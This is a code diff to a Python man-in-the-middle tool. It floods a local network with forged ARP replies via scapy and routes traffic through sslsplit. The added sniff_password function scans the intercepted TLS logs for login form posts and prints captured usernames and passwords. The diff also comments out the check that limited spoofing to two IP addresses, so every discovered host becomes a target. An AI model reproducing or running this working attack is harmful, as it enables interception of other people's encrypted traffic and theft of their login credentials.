@@ -4,7 +4,10 @@ import netifaces as ni
 from math import log2
 from scapy.all import ARP, Ether, srp, send
 from subprocess import Popen, DEVNULL
+import subprocess
 import time
+import threading
+import os
 
 arp_table = {}
 hot_ip = None
@@ -63,7 +66,8 @@ def send_fake_arp():
 		arp_to_victim = ARP(op=2, pdst=i,      hwdst=arp_table[i]['mac'], psrc=gtw_ip, hwsrc=hot_mc)
 		arp_to_router = ARP(op=2, pdst=gtw_ip, hwdst=rt_mac,              psrc=hot_ip, hwsrc=hot_mc)
 		
-		if i != '192.168.0.163' and i != '192.168.0.141': continue;
+		# Local demo use
+		# if i != '192.168.0.163' and i != '192.168.0.141': continue;
 
 		send(arp_to_victim, verbose=False)
 		send(arp_to_router, verbose=False)
@@ -75,21 +79,52 @@ def ssl_split():
 	], stdout=DEVNULL, stderr=DEVNULL)
 	return	
 
+def sniff_password():
+	try:
+		while True:
+			fil_nam = []
+			for fil_nam in os.listdir("./sslsplit-log"):
+				if '.bak' in fil_nam: continue;
+				# print(fil_nam)
+				f = open( "./sslsplit-log/" + fil_nam, errors="replace")
+				lines = f.readlines()
+				find = 0
+				for i in lines:
+					if "logintoken" in i:
+						lis = i.split('&')
+						nam = lis[1].split('=')[1]
+						pas = lis[2].split('=')[1]
+						print("Username:", nam)
+						print("Password:", pas, end = "\n\n")
+						find = 1
+				f.close()
+				if find:
+					os.rename("./sslsplit-log/" + fil_nam, "./sslsplit-log/" + fil_nam + '.bak')
+			time.sleep(3)
+			if not os.path.exists('sslsplit.pid'): return;
+	except KeyboardInterrupt:
+		return
+	return
+
 def main():
 	arp_scan()
 	send_fake_arp()
 	
 	ssl_split()
+	trd = threading.Thread(target = sniff_password)
+	trd.start()
 
 	while True:
 		try:
 			send_fake_arp()
-			time.sleep(5)
+			time.sleep(2)
 		except KeyboardInterrupt:
+			if not os.path.exists('sslsplit.pid'): break;
 			with open('sslsplit.pid') as f:
 				pid = next(f).strip()
 				Popen(['kill', pid])
-			break
+			break	
+	trd.join()
 	return 
 
 
